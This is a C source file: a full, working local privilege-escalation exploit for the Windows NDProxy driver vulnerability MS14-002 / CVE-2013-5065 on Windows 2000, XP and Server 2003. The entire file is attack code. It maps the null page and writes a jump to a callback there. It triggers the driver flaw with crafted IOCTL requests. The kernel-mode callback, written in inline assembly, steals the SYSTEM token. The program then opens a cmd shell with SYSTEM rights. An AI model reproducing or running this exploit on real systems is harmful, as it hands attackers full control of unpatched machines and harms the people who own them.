//
// An exploit for the MS14-002 / CVE-2013-5065 (KB2914368), written by dev_zzo.
//
// Affected systems:
// + Windows Server 2003 R2 SP2 (x86, x64?)
// + Windows XP SP3 (x86, x64?)
// + Windows 2000 SP4 (x86)
//
// What is the root cause of the vulnerability?
//
// It is caused due to an off-by-one error in the ndproxy!PxIODispatch() function
// when handling IOCTL requests 8FFF23C8 and 8FFF23CC.
// The error causes execution flow to be directed to a fixed address 0x00000038.
//
// References:
// [0] https://technet.microsoft.com/en-us/library/security/ms14-002.aspx
// [1] https://technet.microsoft.com/library/security/2914486
//

#include <Windows.h>
#include <Winternl.h>

#pragma comment(linker, "/entry:__mainCRTStartup")
#pragma comment(linker, "/subsystem:console")
#pragma comment(lib, "kernel32")

#define NTVER(maj, min, csd) ((maj << 24) | (min << 16) | (csd << 8))
// Windows 2000 SP4 UR1
//#define NTOS_TARGET_VER NTVER(5,0,4)
// Windows XP SP3
//#define NTOS_TARGET_VER NTVER(5,1,3)
// Windows Server 2003 R2 SP2
//#define NTOS_TARGET_VER NTVER(5,2,2)

#pragma function(memset)
void *memset(void *ptr, int v, size_t num)
{
    char *p = (char *)ptr;
    while (num--)
        *p++ = 0;
    return ptr;
}

static size_t __strlen(const char *s)
{
    const char *p = s;
    while (*p) ++p;
    return p - s;
}

typedef int (__cdecl *pvsprintf)(char *buffer, const char *format, va_list argptr); 
static pvsprintf vsprintf; 

static void __puts(const char *text)
{
    DWORD charsWritten;
    WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), text, __strlen(text), &charsWritten, NULL);
}

static int __printf(const char *fmt, ...)
{
    char buffer[1024];
    int length;
    DWORD charsWritten;
    va_list args;

    va_start(args, fmt);
    length = vsprintf(buffer, fmt, args);
    WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), buffer, length, &charsWritten, NULL);
    va_end(args);
    return length;
}


typedef NTSYSAPI NTSTATUS (NTAPI *PNTCREATEFILE)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength);
static PNTCREATEFILE _NtCreateFile;

typedef NTSYSAPI NTSTATUS (NTAPI *PNTALLOCATEVIRTUALMEMORY)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect);
static PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory;

static void GrabNtdllRoutines(void)
{
    HMODULE hNtdll;

    hNtdll = GetModuleHandleA("ntdll.dll");
    vsprintf = (pvsprintf)GetProcAddress(hNtdll, "vsprintf");
    _NtCreateFile = (PNTCREATEFILE)GetProcAddress(hNtdll, "NtCreateFile");
    NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
}

static NTSTATUS MapPageZero(SIZE_T Size)
{
	PVOID BaseAddress = (PVOID)1;

	return NtAllocateVirtualMemory((PVOID)-1, &BaseAddress, 0, &Size, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
}


#if (NTOS_TARGET_VER == NTVER(5,0,4))

#define SYSTEM_PID 8
#define OFFSET_KPCR_KTHREAD 0x124
#define OFFSET_KTHREAD_KPROCESS 0x44
#define OFFSET_EPROCESS_UNIQUEPID 0x9C
#define OFFSET_EPROCESS_APLINKS 0xA0
#define OFFSET_EPROCESS_TOKEN 0x12C

#elif (NTOS_TARGET_VER == NTVER(5,1,3))

#define SYSTEM_PID 4
#define OFFSET_KPCR_KTHREAD 0x124
#define OFFSET_KTHREAD_KPROCESS 0x44
#define OFFSET_EPROCESS_UNIQUEPID 0x84
#define OFFSET_EPROCESS_APLINKS 0x88
#define OFFSET_EPROCESS_TOKEN 0xC8

#elif (NTOS_TARGET_VER == NTVER(5,2,2))

#define SYSTEM_PID 4
#define OFFSET_KPCR_KTHREAD 0x124
#define OFFSET_KTHREAD_KPROCESS 0x128
#define OFFSET_EPROCESS_UNIQUEPID 0x94
#define OFFSET_EPROCESS_APLINKS 0x98
#define OFFSET_EPROCESS_TOKEN 0xD8

#else
#error Please define NTOS_TARGET_VER.
#endif

static void TokenStealer(void)
{
    __asm {
        mov   eax, fs:[OFFSET_KPCR_KTHREAD]
        mov   eax, [eax + OFFSET_KTHREAD_KPROCESS]
        push  eax

aplinks_loop:
        mov   eax, [eax + OFFSET_EPROCESS_APLINKS]
        lea   eax, [eax - OFFSET_EPROCESS_APLINKS]
        cmp   dword ptr [eax + OFFSET_EPROCESS_UNIQUEPID], SYSTEM_PID
        jne   aplinks_loop

        mov   eax, [eax + OFFSET_EPROCESS_TOKEN]
        pop   edx
        mov   [edx + OFFSET_EPROCESS_TOKEN], eax
    }
}


static int PayloadExecuted = 0;

static void __stdcall Callback(void *p)
{
    /* Executed in kernel mode */
    PayloadExecuted = 1;
    TokenStealer();
    return;
}

static int SpawnCmd(void)
{
	STARTUPINFOA StartInfo;
	PROCESS_INFORMATION ProcInfo;
    char ComSpec[128];
    BOOL Success;

    if (GetEnvironmentVariableA("ComSpec", ComSpec, sizeof(ComSpec)) == 0) {
        return FALSE;
    }

    memset(&StartInfo, 0, sizeof(StartInfo));
    StartInfo.cb = sizeof(StartInfo);
	Success = CreateProcessA(
		NULL,
		ComSpec,
		NULL,
		NULL,
		TRUE,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&StartInfo,
		&ProcInfo);
    return Success;
}

static void Exploit(void)
{
    HANDLE hDevice;
    BOOL Success;
    NTSTATUS Status;
    UNICODE_STRING DeviceName;
    OBJECT_ATTRIBUTES ObjAttrs;
    IO_STATUS_BLOCK Iosb;
    DWORD IoctlInputBuffer[0x15] = {
        0x00000000U,
        0x00000000U,
        0x00000000U,
        0x00000000U,

        0x00000000U,
        0x07030125U,
        0x00000000U,
        0x00000034U,
    };
    DWORD IoctlOutputBuffer[9];
    DWORD BytesReturned;
    PBYTE PageZero = NULL;

    GrabNtdllRoutines();

    __puts("\n[.] Opening the device... ");
    DeviceName.Length = sizeof(L"\\Device\\NDProxy") - 2;
    DeviceName.MaximumLength = sizeof(L"\\Device\\NDProxy");
    DeviceName.Buffer = L"\\Device\\NDProxy";
    InitializeObjectAttributes(&ObjAttrs, &DeviceName, 0, NULL, NULL);
    Status = _NtCreateFile(
        &hDevice, /* FileHandle */
        FILE_GENERIC_READ, /* DesiredAccess */
        &ObjAttrs, /* ObjectAttributes */
        &Iosb, /* IoStatusBlock */
        NULL, /* AllocationSize */
        FILE_ATTRIBUTE_NORMAL, /* FileAttributes */
        FILE_SHARE_READ|FILE_SHARE_WRITE, /* ShareAccess */
        FILE_OPEN, /* CreateDisposition */
        0, /* CreateOptions */
        NULL, 0);
    if (Status) {
        __printf("FAILED.\n[!] NTSTATUS is: %p", Status);
        return;
    }
    __puts("OK.");

    __puts("\n[.] Mapping page zero... ");
    Status = MapPageZero(0x1000);
    if (Status) {
        __printf("FAILED.\n[!] NTSTATUS is: %p", Status);
        return;
    }
    PageZero[0x38] = 0xE9;
    *(UINT_PTR *)&PageZero[0x39] = (UINT_PTR)&Callback - 0x3D;

    __puts("\n[.] Invoking IOCTL 8FFF23C0... ");
    Success = DeviceIoControl(
        hDevice,
        0x8FFF23C0U,
        IoctlInputBuffer, /* lpInBuffer */
        sizeof(IoctlInputBuffer), /* nInBufferSize */
        IoctlOutputBuffer, /* lpOutBuffer */
        sizeof(IoctlOutputBuffer), /* nOutBufferSize */
        &BytesReturned, /* lpBytesReturned */
        NULL);
    if (!Success) {
        __printf("FAILED.\n[!] GetLastError() says: %p", GetLastError());
        return;
    }
    __puts("OK.");

    __puts("\n[.] Invoking IOCTL 8FFF23C8... ");
    Success = DeviceIoControl(
        hDevice,
        0x8FFF23C8U,
        IoctlInputBuffer, /* lpInBuffer */
        sizeof(IoctlInputBuffer), /* nInBufferSize */
        IoctlOutputBuffer, /* lpOutBuffer */
        sizeof(IoctlOutputBuffer), /* nOutBufferSize */
        &BytesReturned, /* lpBytesReturned */
        NULL);
    if (!Success) {
        __printf("FAILED.\n[!] GetLastError() says: %p", GetLastError());
        return;
    }
    __puts("OK.");

    __puts("\n[.] Checking whether payload was actually executed... ");
    if (!PayloadExecuted) {
        __puts("NOPE.\n[-] Sorry about this. Please report to the exploit author.");
        return;
    }
    __puts("YEP.");

    __puts("\n[.] Spawning the CMD shell... ");
    Success = SpawnCmd();
    if (!Success) {
        __printf("FAILED.\n[!] GetLastError() says: %p", GetLastError());
        return;
    }
    __puts("OK.");

    __puts("\n[+] Exploit successful.");
}

void __mainCRTStartup(void)
{
    __puts("\nExploit for MS14-002 / CVE-2013-5065\n");
    __puts("More at: https://github.com/dev-zzo/exploits-nt-privesc \n");

    __puts("\n[!] Exploit starting...");
    Exploit();

	__puts("\n[+] XOXO, dev_zzo.\n");
}
